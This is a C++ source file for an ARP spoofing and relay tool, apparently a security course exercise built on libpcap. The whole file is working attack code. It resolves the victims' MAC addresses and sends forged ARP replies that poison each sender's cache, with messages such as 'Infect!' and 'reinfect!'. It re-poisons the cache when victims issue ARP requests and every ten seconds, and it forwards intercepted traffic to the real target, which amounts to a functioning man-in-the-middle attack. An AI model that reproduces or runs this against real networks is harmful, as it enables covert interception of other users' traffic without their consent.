#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <fstream>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

pcap_t* handle;
Ip sender_ip[20], target_ip[20];
Mac my_mac, sender_mac[20], target_mac[20];

int GetMacAddr(const char* interface, uint8_t* mac_addr);
int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest);
void GetMacAddrImsi(char* argv[], int cnt);
bool validate_args(int argc);
int get_infect_count(int argc);
void init_pcap(const char* dev);
void init_macs(const char* dev, char* argv[], int infect_cnt);
void initial_infect(int infect_cnt);
void packet_loop(int infect_cnt);

int main(int argc, char* argv[]) {
    if (!validate_args(argc)) {
        usage();
        return -1;
    }

    const char* dev = argv[1];
    init_pcap(dev);

    int infect_cnt = get_infect_count(argc);
    init_macs(dev, argv, infect_cnt);
    initial_infect(infect_cnt);

    packet_loop(infect_cnt);

    pcap_close(handle);
    return 0;
}

bool validate_args(int argc) {
    return (argc >= 4 && (argc % 2) == 0);
}

int get_infect_count(int argc) {
    return (argc - 2) / 2;
}

void init_pcap(const char* dev) {
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        exit(-1);
    }
}

void init_macs(const char* dev, char* argv[], int infect_cnt) {
    uint8_t mac_buf[6];
    if (GetMacAddr(dev, mac_buf) < 0) {
        fprintf(stderr, "Failed to get own MAC address\n");
        exit(-1);
    }
    my_mac = Mac(mac_buf);
    GetMacAddrImsi(const_cast<char**>(argv), infect_cnt * 2);
}

void initial_infect(int infect_cnt) {
    for (int i = 0; i < infect_cnt; i++) {
        if (send_packet_arp(
                sender_mac[i], my_mac, sender_mac[i],
                Ip(target_ip[i]), Ip(sender_ip[i]), false) == 0) {
            printf("Infect! (INIT)\n");
        }
    }
    printf("Infect All (INIT)\n");
}

void packet_loop(int infect_cnt) {
    struct pcap_pkthdr* header;
    const u_char* rcvpacket;
    PEthHdr ethernet_hdr;
    PArpHdr arp_hdr;
    time_t start_time = time(NULL);

    while (true) {
        int res = pcap_next_ex(handle, &header, &rcvpacket);
        if (!res) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

        ethernet_hdr = (PEthHdr)rcvpacket;
        uint16_t eth_type = ethernet_hdr->type();

        if (eth_type == EthHdr::Arp) {
            // Handle ARP packet: reinfection
            rcvpacket += sizeof(EthHdr);
            arp_hdr = (PArpHdr)rcvpacket;
            for (int i = 0; i < infect_cnt; i++) {
                if (arp_hdr->sip() == sender_ip[i] && arp_hdr->tip() == target_ip[i]) {
                    if (send_packet_arp(
                            Mac(arp_hdr->smac()), my_mac, Mac(arp_hdr->smac()),
                            arp_hdr->tip(), arp_hdr->sip(), false) == 0) {
                        printf("reinfect!\n");
                    }
                    break;
                }
            }
        } else {
            // Forward other packets between sender and target
            for (int i = 0; i < infect_cnt; i++) {
                if (sender_mac[i] == ethernet_hdr->smac_) {
                    ethernet_hdr->dmac_ = target_mac[i];
                    ethernet_hdr->smac_ = my_mac;
                    if (pcap_sendpacket(handle, rcvpacket, header->len) != 0) {
                        printf("Error sending packet!\n");
                    } else {
                        printf("Packet sent successfully.\n");
                    }
                    break;
                }
            }
        }

        // Periodic reinfection every 10 seconds
        if (difftime(time(NULL), start_time) >= 10) {
            initial_infect(infect_cnt);
            start_time = time(NULL);
        }
    }
}

// Existing helper functions unchanged
int GetMacAddr(const char* interface, uint8_t* mac_addr) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return -1;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        close(sockfd);
        return -1;
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    close(sockfd);
    return 0;
}

int send_packet_arp(Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip, bool isRequest) {
    EthArpPacket packet;
    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(isRequest ? ArpHdr::Request : ArpHdr::Reply);
    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tmac_ = tmac;
    packet.arp_.tip_ = htonl(tip);
    return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

void GetMacAddrImsi(char* arg[], int cnt) {
    for (int i = 0; i < cnt; i++) {
        struct pcap_pkthdr* header;
        const u_char* rcvpacket;
        PEthHdr eth;
        PArpHdr arp;
        send_packet_arp(
            Mac("ff:ff:ff:ff:ff:ff"), my_mac, Mac::nullMac(),
            Ip("0.0.0.0"), Ip(arg[i+2]), true);
        while (true) {
            int res = pcap_next_ex(handle, &header, &rcvpacket);
            if (!res) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
            eth = (PEthHdr)rcvpacket;
            if (eth->type() == EthHdr::Arp) {
                arp = (PArpHdr)(rcvpacket + sizeof(EthHdr));
                if (static_cast<uint32_t>(arp->sip()) == static_cast<uint32_t>(Ip(arg[i+2]))) {
                    break;
                }
            }
        }
        if ((i % 2) == 0) {
            sender_mac[i/2] = Mac(arp->smac());
            sender_ip[i/2] = Ip(arg[i+2]);
        } else {
            target_mac[(i-1)/2] = Mac(arp->smac());
            target_ip[(i-1)/2] = Ip(arg[i+2]);
        }
    }
}
